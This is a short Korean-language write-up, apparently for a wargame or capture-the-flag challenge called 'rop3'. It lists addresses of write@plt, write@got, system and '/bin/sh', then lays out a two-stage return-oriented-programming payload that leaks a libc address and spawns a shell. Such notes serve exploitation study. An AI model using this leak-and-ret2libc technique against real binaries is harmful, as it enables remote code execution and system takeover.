@@ -1,0 +1,37 @@
+rop3 풀이
+
+메인함수가 없다고 나은다
+?????
+
+info files 로 프로그램 시작 주소인 entry point 를 찾아가보자.
+
+OEP = 0x08048340
+
+read함수가 시작 하기 전 위치까지 한줄씩 내려와봤다. 
+
+read : 0x080483fd
+
+write : 0x08048426
+
+0xf7f79d4c ("/bin/sh")
+0xf7ef4460 <write>
+0xf7e57310 <system>
+ 
+wirte@plt 0x0804830c
+write@got 0x08049614
+
+공격 스택
+
+buf[136]
+dummy 4b
+write@plt // 0x0804830c
+OEP // 0x080483fd
+1 // stdout
+write@got // 0x08049614
+4 //byte 
+
+buf[136]
+dummy 4b
+addr_system
+dummy 4b 
+addr_binsh 
